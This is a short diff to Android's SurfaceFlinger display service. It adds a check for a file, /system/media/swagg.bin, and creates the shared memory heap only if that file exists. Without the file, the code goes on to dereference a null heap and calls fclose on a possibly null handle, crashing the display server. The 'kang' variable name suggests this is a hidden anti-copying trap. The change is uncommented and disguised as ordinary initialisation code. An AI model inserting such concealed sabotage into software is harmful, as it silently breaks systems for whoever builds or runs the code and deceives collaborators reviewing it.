@@ -237,9 +237,14 @@ status_t SurfaceFlinger::readyToRun()
         plane.setDisplayHardware(hw);
     }
 
+    FILE * kang_fp = fopen("/system/media/swagg.bin", "r");
+    if(kang_fp) {
     // create the shared control-block
     mServerHeap = new MemoryHeapBase(4096,
             MemoryHeapBase::READ_ONLY, "SurfaceFlinger read-only heap");
+    }
+    fclose(kang_fp);
+
     LOGE_IF(mServerHeap==0, "can't create shared memory dealer");
 
     mServerCblk = static_cast<surface_flinger_cblk_t*>(mServerHeap->getBase());
